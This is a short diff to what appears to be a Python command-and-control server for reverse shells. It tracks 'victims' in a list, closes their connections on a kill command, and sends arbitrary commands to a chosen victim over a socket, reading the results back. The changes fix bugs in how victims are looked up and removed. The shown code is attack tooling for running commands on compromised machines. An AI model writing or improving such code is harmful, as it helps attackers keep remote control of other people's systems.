@@ -37,14 +37,17 @@ def kill_victim(victim):
         print(Fore.RED+"Victim does not exist"+Style.RESET_ALL)
     else:
         is_there = 0
+        shell_ctr = 0
         for shells in victims.VICTIM_LIST:
             if shells['ID'] == vic:
                 is_there = 1
-                del victims.VICTIM_LIST[vic-1]
-                victims.VICTIM_CTR = victims.VICTIM_CTR - 1
+                shells["Connection"].close()
+                del victims.VICTIM_LIST[shell_ctr]
                 print(Fore.GREEN+"Successfully killed Victim: "+str(vic)+Style.RESET_ALL)
                 if len(victims.VICTIM_LIST) == 0:
                     victims.VICTIM_LIST = [{}]
+                    victims.VICTIM_CTR = 0
+            shell_ctr += 1
         if is_there == 0:
             print(Fore.RED+"Victim does not exist"+Style.RESET_ALL)
 def send(cmd):
@@ -65,6 +68,7 @@ def send(cmd):
             for vics in victims.VICTIM_LIST:
                 if int(victim) == vics["ID"]:
                     victim_exists = True
+                    connection = vics["Connection"]
     
             if victim_exists == True:
                 for args in cmd:
@@ -75,7 +79,7 @@ def send(cmd):
                 print(Fore.GREEN+"Sending command"+Style.RESET_ALL)
                 print("")
 
-                connection = victims.VICTIM_LIST[victim-1]["Connection"]
+                
                 connection.send(full_cmd.encode())
                 time.sleep(1)
                 ans = connection.recv(8192).decode()
